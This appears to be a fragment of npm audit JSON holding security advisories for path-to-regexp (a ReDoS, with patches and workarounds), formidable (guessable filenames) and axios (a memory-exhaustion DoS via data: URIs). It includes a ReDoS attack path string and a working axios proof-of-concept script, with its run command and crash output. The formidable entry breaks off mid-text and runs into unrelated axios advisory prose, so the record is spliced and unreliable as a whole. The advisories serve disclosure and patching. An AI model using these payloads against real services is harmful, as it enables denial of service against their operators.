For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)","reported_by":null,"title":"path-to-regexp outputs backtracking regular expressions","metadata":null,"cves":["CVE-2024-45296"],"access":"public","severity":"high","module_name":"path-to-regexp","vulnerable_versions":">=0.2.0 <1.9.0","github_advisory_id":"GHSA-9wv6-86v2-598j","recommendation":"Upgrade to version 1.9.0 or later","patched_versions":">=1.9.0","updated":"2025-01-24T21:32:30.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"cwe":["CWE-1333"],"url":"https://github.com/advisories/GHSA-9wv6-86v2-598j"},"1105075":{"findings":[{"version":"3.5.2","paths":["@hmcts/nodejs-healthcheck>superagent>formidable"]}],"found_by":null,"deleted":null,"references":"- https://nvd.nist.gov/vuln/detail/CVE-2025-46653\n- https://github.com/node-formidable/formidable/commit/022c2c5577dfe14d2947f10909d81b03b6070bf5\n- https://github.com/node-formidable/formidable/blob/d0fbec13edc8add54a1afb9ce1a8d3db803f8d47/CHANGELOG.md?plain=1#L10\n- https://github.com/zast-ai/vulnerability-reports/blob/main/formidable/file_upload/report.md\n- https://github.com/node-formidable/formidable/commit/37a3e89fca1ed68ec674a539f13aafd62221ddaa\n- https://www.npmjs.com/package/formidable/v/2.1.3\n- https://www.npmjs.com/package/formidable/v/3.5.3\n- https://github.com/advisories/GHSA-75v8-2h7p-7m2m","created":"2025-04-26T21:31:26.000Z","id":1105075,"npm_advisory_id":null,"overview":"Formidable (aka node-formidable) 2.x before 2.1.3 and 3.x before 3.5.3 relies on hexoid to prevent guessing of filenames for untrusted executable content; however, hexoid is documented as not \"cryptographically secure.\" (Also, there is a scenario in which only the last two characters of a hexoid string need to be guessed, but this is not often relevant.)

Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env && config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err => {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n<--- Last few GCs --->\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body.
